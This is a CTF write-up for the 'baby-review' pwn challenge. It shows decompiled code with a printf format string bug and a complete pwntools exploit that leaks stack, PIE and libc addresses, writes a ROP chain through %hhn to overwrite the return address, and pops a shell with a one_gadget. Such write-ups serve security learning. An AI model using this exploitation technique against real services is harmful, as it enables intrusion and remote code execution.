### Problem statement ###

In this problem we are given a libc and the challenge binary. On checking the decompilation, this seems to be a format string vulnerability.

The challenge code looks like this
```
undefined8 main(void)

{
  time_t tVar1;
  size_t sVar2;
  char local_58 [64];
  undefined1 *local_18;
  int local_c;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  load_countries();
  puts("Alright I need to prove you\'re human so lets do some geography");
  local_c = rand();
  local_c = local_c % num_countries;
  local_18 = countries + (long)local_c * 100;
  printf("What is the capital of %s?\n",local_18);
  fgets(local_58,0x32,stdin);
  sVar2 = strcspn(local_58,"\r\n");
  local_58[sVar2] = '\n';
  strcmp(local_58,local_18 + 0x32);
  puts("Correct!");
  puts("Alright I\'ll let you through");
  menu();
  return 0;
}

```
The code of menu function is 
```
void menu(void)

{
  undefined local_158 [303];
  char local_29;
  undefined local_28 [32];
  
  do {
    puts("What would you like to do?");
    puts("1. Read a book?");
    puts("2. Watch a movie?");
    puts("3. Review a book/movie");
    puts("4. Exit");
    __isoc99_scanf(&DAT_0010228e,&local_29);
    getchar();
    switch(local_29) {
    case '1':
      read_book();
      break;
    case '2':
      watch_movie(local_158);
      break;
    case '3':
      review();
      break;
    case '4':
      puts("Sad to see you go.");
      puts("Could I get your name for my records?");
      read(0,local_28,0x30);
      return;
    case '5':
      add_movie(local_158);
      break;
    default:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```
The function ```watch_movie``` has a format string bug

```
void watch_movie(char *param_1)

{
  puts(&DAT_00102078);
  puts("https://www.youtube.com/watch?v=2bGvWEfLUsc");
  puts("https://www.youtube.com/watch?v=0u1oUsPWWjM");
  puts("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  puts("https://www.youtube.com/watch?v=Icx4xul9LEE");
  printf(param_1);
  return;
}
```

This ```param1``` can be set using the ```add_movie``` function

```
void add_movie(char *param_1)

{
  char *pcVar1;
  
  puts("Enter your movie link here and I\'ll add it to the list");
  read(0,param_1,300);
  pcVar1 = strstr(param_1,"%n");
  if (pcVar1 != (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}

```

Since the binary has PIE enabled, we need to leak the binary base and libc address. The attack idea is to use the format string to overwrite the return address.

Overwriting the return address with ```system('bin/sh')``` was not working for some reason, so I used ```one_gadget``` to pop a shell.

### Exploit ###

```
from pwn import *
countries = {}
with open("countries.txt", "r") as f:
    for line in f.readlines():
        line = line.strip().split(" ")
        name, capital = line[0],line[-1]
        countries[name]=capital

def write_value(addr, value):
    for i in range(8):
        p.recvuntil(b"4. Exit\n")
        p.sendline(b"5")
        p.recvuntil(b"Enter your movie link here and I\'ll add it to the list\n")
        payload = b"%"
        if(p64(value)[i] == 0):
            payload += str(0x100).encode() + b"c%13$hhn"
        else:
            payload += str(p64(value)[i]).encode() + b"c%13$hhn"
        payload += b"A"*(24 - len(payload))
        payload += p64(addr+i)
        p.sendline(payload)
        p.recvuntil(b"4. Exit\n")
        p.sendline(b"2")


p = remote("chals.damctf.xyz", 30888)
#p = process("./baby-review")
context.terminal = ["tmux", "splitw", "-h"]
gdbscript = """
br *menu+299
"""
elf = ELF("./baby-review")
libc = ELF("./libc.so.6")
p.recvline()
#gdb.attach(p, gdbscript)
out=p.recvline()[:-2].decode().split(" ")[-1]
capital = "asdf" if out not in countries else countries[out]
p.sendline(capital)
p.recvuntil(b"4. Exit\n")
p.sendline(b"5")
p.recvuntil(b"Enter your movie link here and I\'ll add it to the list\n")
p.sendline(b"%7$p|%9$p|%65$p|")
p.recvuntil(b"4. Exit\n")
p.sendline(b"2")
p.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
stack_leak = int(p.recvuntil(b"|")[:-1].decode(), 16)
binary_leak = int(p.recvuntil(b"|")[:-1].decode(), 16)
libc_leak = int(p.recvuntil(b"|")[:-1].decode(), 16)

elf.address = binary_leak - 5504
libc.address = libc_leak - 171408
return_address = stack_leak + 344
print("Binary base: 0x%x" %elf.address)
print("Return address: 0x%x"%return_address)
print("System address 0x%x"%libc.sym['system'])
POP_RDI = libc.address + 0x000000000002a3e5
POP_RSI = libc.address + 0x00000000001303b2
POP_POP_RDX = libc.address + 0x000000000011f497
write_value(return_address, POP_RSI)
write_value(return_address+0x8, 0x0)
write_value(return_address+0x10, POP_POP_RDX)
write_value(return_address+0x18, 0x0)
write_value(return_address+0x28, libc.address + 0xebcf8)
p.recvuntil(b"4. Exit\n")
p.sendline(b"4")
p.recvuntil(b"Could I get your name for my records?\n")
p.sendline(b"A")
p.interactive()

```
